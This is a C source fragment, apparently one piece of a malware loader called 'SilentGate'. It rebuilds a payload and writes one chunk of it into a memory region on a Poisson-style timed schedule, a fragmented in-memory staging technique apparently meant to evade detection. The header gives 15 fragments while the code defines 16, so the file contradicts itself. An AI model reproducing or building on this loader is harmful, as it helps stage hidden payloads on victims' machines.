/*
 * SilentGate Fragment 3/15
 * Offset: 22827 bytes  Size: 7609 bytes
 * Schedule: t=370ms (Poisson process)
 * Author: JarDani
 */

#include <windows.h>
#include <math.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FRAGMENT_ID   3
#define N_FRAGMENTS   16
#define PAYLOAD_SIZE  121746
#define CHUNK_OFFSET  22827
#define CHUNK_SIZE    7609
#define SLEEP_NEXT_MS 370

/* Forward declaration of reconstructor */
extern unsigned char* sg_reconstruct(int* out_len);


/* Fragment 3: Write chunk 3 */
void sg_execute_fragment_3(PVOID mem) {
    if (!mem) return;
    printf("[FRAG 3] Writing chunk at t=370ms\n");

    int len = 0;
    unsigned char* payload = sg_reconstruct(&len);
    memcpy((BYTE*)mem + CHUNK_OFFSET, payload + CHUNK_OFFSET, CHUNK_SIZE);
    free(payload);

    printf("[FRAG 3] Chunk 3 written at offset %d\n", CHUNK_OFFSET);
    Sleep(SLEEP_NEXT_MS);
}
